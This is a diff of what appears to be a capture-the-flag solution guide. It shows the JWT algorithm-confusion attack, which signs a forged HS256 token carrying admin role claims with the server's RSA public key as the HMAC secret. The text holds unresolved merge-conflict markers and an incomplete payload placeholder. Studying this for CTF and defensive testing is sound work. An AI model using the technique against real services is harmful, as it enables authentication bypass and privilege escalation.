@@ -43,6 +43,7 @@
   - Simpler: Use the provided public key to sign.
 
 ### 4. Sign with HS256 using public key
+<<<<<<< HEAD
 - Save the public key from `public.pem` (copy the content)
 - Use Python in Burp's interpreter or external:
 ```python
@@ -56,6 +57,19 @@ def enc(x): return base64.urlsafe_b64encode(json.dumps(x).encode()).rstrip(b'=')
 # Then sign:
 token = jwt.encode(json.loads(payload), public_key, algorithm='HS256')
 # But need to include header; jwt.encode will set alg from param.
+=======
+- **Players receive the public.pem file** - copy its contents
+- Use Python in Burp's interpreter or external:
+```python
+import jwt
+# Use the public key from public.pem as the HMAC secret
+public_key = open('public.pem').read()  # Players have this file
+# payload as dict (modify from decoded token)
+payload = {"sub":"admin","role":"admin","expiry":...}  # keep expiry or set future
+# Sign with HS256 using public key as secret
+token = jwt.encode(payload, public_key, algorithm='HS256')
+print(token)
+>>>>>>> f496a21 (soap3)
 ```
 - Or use jwt.io website: set algorithm to HS256, paste public key as secret, edit payload.
 
